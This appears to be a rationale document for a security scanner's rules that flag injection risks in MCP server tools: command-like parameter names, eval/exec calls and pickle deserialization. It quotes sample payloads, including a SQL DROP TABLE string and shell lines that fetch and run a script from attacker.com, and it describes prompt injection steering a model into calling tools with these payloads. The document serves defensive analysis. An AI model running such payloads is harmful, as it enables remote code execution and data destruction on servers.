# Policy Rationale: MCP Tool Injection Risks

**Policy ID:** `mcp_injection`  
**File:** `internal/rules/policies/mcp/injection.yaml`  
**Rules:** MCP-001, MCP-002, MCP-003  
**Severities:** High, Critical, Critical

---

## What this policy covers

Injection vulnerabilities specific to MCP (Model Context Protocol) server tools — parameter names that suggest raw command/payload inputs, `eval`/`exec`/`compile` calls, and `pickle`/`marshal` deserialization.

---

## Why MCP tools have a distinct injection threat model

MCP tools are invoked differently from Claude SDK or OpenAI Agents SDK tools:

1. **External orchestrators:** MCP servers are called by external orchestrators — other agents, Claude Desktop, third-party MCP clients. The calling context is broader and less controlled.
2. **Model-controlled inputs by design:** the entire purpose of an MCP tool is to accept inputs from a model. There is no human typing inputs directly — the model generates them entirely.
3. **No SDK-level schema enforcement:** MCP's tool invocation model is schema-validated by the protocol, but the validation is structural (JSON shape), not semantic. A `command: str` parameter accepts *any* string.
4. **Server process privileges:** MCP servers often run as a persistent process with elevated permissions (file system access, database access, shell access) to perform useful work. An injection in this context has broad blast radius.

The combination of broad invocation surface + fully model-controlled inputs + elevated process privileges makes MCP tools the highest-risk category in the karenctl policy set.

---

## Rule-by-rule defense

### MCP-001 — MCP tool accepts injection-prone parameter names (Severity: High, Confidence: 0.75)

**What we detect:**  
MCP tool functions with parameters whose names:
- Exactly match: `cmd`, `command`, `exec`, `expression`, `payload`
- Contain: `command`, `inject`

**Why it is flaggable:**  
Parameter names are a strong signal about what a parameter receives. A parameter named `cmd` in a tool context almost universally receives a command string — one that the model generates and the tool executes. The naming signal is more reliable than trying to trace data flow through the function body.

Parameters named `command` or `cmd` appear in documented injection vulnerabilities in production MCP server implementations. They are not theoretical — they have been exploited in red-team exercises against public MCP server implementations.

**Real-world consequence:**  
An MCP tool `run_query(command: str)` that passes `command` to a database cursor: the model supplies `command = "DROP TABLE users; --"`. If the tool does not use parameterized queries, this is SQL injection. If `command` goes to a shell, it is command injection.

**Why High (not Critical):**  
The parameter name alone is a heuristic signal — not definitive proof of exploitability. The fix (replace open-ended parameter with structured inputs) is the right call regardless, but we assign High rather than Critical because the actual exploitability depends on how the parameter is consumed.

**Confidence 0.75:**  
25% of flagged tools may have legitimate reasons for a parameter named `command` that is consumed safely (e.g., a `command: Literal["start", "stop", "restart"]` with exhaustive validation). The rule correctly fires in these cases — the explanation tells the reviewer to confirm before applying the fix.

---

### MCP-002 — MCP tool contains eval or exec call (Severity: Critical, Confidence: 0.90)

**What we detect:**  
MCP tool function bodies containing any of: `eval(`, `exec(`, `compile(`, `__import__(`.

**Why it is flaggable:**  
`eval()` and `exec()` execute arbitrary Python from a string. `compile()` is a precursor to `exec()`. `__import__()` imports arbitrary modules at runtime. All four are code execution primitives.

In an MCP tool, these functions receive inputs that ultimately originate from the model — which processes external content, user messages, and data from tools. A prompt injection payload in any of those sources can cause the model to generate a string that, when passed to `eval()`, executes arbitrary code.

This is not a potential vulnerability — it is an actual RCE vector whenever model-controlled inputs can reach the eval/exec call. The threat model assumes this is always possible in a deployed MCP server.

**Real-world consequence:**  
An MCP tool `evaluate_expression(expression: str)` that calls `eval(expression)`: the model is prompted to "evaluate the expression `__import__('subprocess').run(['curl', 'attacker.com/shell.sh', '-o', '/tmp/s.sh'])`" → arbitrary code executes on the MCP server process.

**Why Critical:**  
The presence of `eval()` or `exec()` in an MCP tool body is nearly unconditionally a Critical finding. The only exception would be a tool that is completely isolated from model-controlled inputs — which would be a very unusual design for an MCP tool. Confidence is 0.90 (not 1.0) because in rare cases, `eval` may appear in a dead code path or test helper not reachable from the tool's main logic.

**The gap: string detection:**  
We use body text search (`has_body_text`) rather than AST analysis for this rule. This means `eval(x)` is detected but `getattr(builtins, 'eval')(x)` is not. Dynamic dispatch to eval is an intentional blind spot — if a developer is going that far to hide eval usage, they are actively trying to evade detection, which is a separate concern.

---

### MCP-003 — MCP tool deserializes data with pickle or marshal (Severity: Critical, Confidence: 0.95)

**What we detect:**  
MCP tool function bodies containing: `pickle.loads`, `pickle.load(`, `marshal.loads`, `marshal.load(`.

**Why it is flaggable:**  
Python's `pickle` module is documented as unsafe for untrusted data in the official Python documentation. Pickling is a serialization format that executes arbitrary Python code during deserialization — specifically, via the `__reduce__` dunder method. Any object can define `__reduce__` to return a callable and arguments; when unpickled, that callable is invoked.

A pickle payload that executes `os.system("curl attacker.com/shell | bash")` is 50–100 bytes of binary data. If an MCP tool deserializes this payload from model-controlled input (a string, a base64-decoded blob, a file the agent downloaded), the code executes immediately.

`marshal` has the same property — it is even less restrictive than pickle and is explicitly documented as not safe for untrusted data.

**Real-world consequence:**  
An MCP tool `load_agent_state(state_blob: str)` that base64-decodes and pickles the blob: a prompt injection induces the model to call this tool with a malicious pickle payload → RCE on the MCP server.

**Why Critical with 0.95 confidence:**  
Unlike eval/exec (which can theoretically be safe with enough sandboxing), pickle deserialization is fundamentally unsafe for untrusted data. There is no safe way to use `pickle.loads` on model-controlled input. The 5% confidence gap accounts for tools that use pickle exclusively on data they write themselves (e.g., a cache that pickles its own output and reads it back), with no model-controlled input reaching the pickle call. Even in those cases, we recommend migrating to JSON to avoid the pattern entirely.

---

## What this policy does not cover

- **SQL injection:** MCP tools that construct SQL from model-supplied strings without parameterization. Not currently in scope — add an `mcp_sql` policy if SQL tools are common.
- **Command injection via subprocess without shell=True:** this is OSH-001/002's domain but those rules apply to `claude_sdk_tool` and `mcp_tool`. OSH rules should fire alongside MCP rules for shell-calling MCP tools.
- **YAML/XML deserialization:** `yaml.load()` (not `yaml.safe_load()`) and `lxml` with entity expansion are also unsafe deserializers. Not currently detected.
- **Indirect injection:** a tool that reads a file and eval's its contents is dangerous even if no parameter is named `command` and the eval call doesn't have a literal model-controlled arg in the same line.

---

## Recommendations beyond the fix

**For MCP-001 (injection-prone parameter names):**
```python
# Instead of:
def run_query(command: str) -> dict: ...

# Use structured inputs:
def run_query(
    table: Literal["users", "orders", "products"],
    filter_column: Literal["id", "email", "status"],
    filter_value: str,
) -> dict: ...
```
Replace open-ended string commands with typed, bounded inputs. Use `Literal` types for fixed vocabularies.

**For MCP-002 (eval/exec):**
```python
# Instead of eval(), use a dispatch table:
ALLOWED_OPERATIONS = {
    "add": lambda a, b: a + b,
    "multiply": lambda a, b: a * b,
}
def compute(operation: str, a: float, b: float) -> dict:
    if operation not in ALLOWED_OPERATIONS:
        return {"error": "unsupported_operation", "retryable": False}
    return {"result": ALLOWED_OPERATIONS[operation](a, b)}
```

**For MCP-003 (pickle/marshal):**
- Replace `pickle` with `json`, `msgpack`, or `protobuf` for all serialization.
- If you need Python object serialization, use `jsonpickle` with a strict class allowlist, or redesign the API to exchange plain data structures.
- Never deserialize data that crosses a trust boundary (network, file, model output) with pickle.
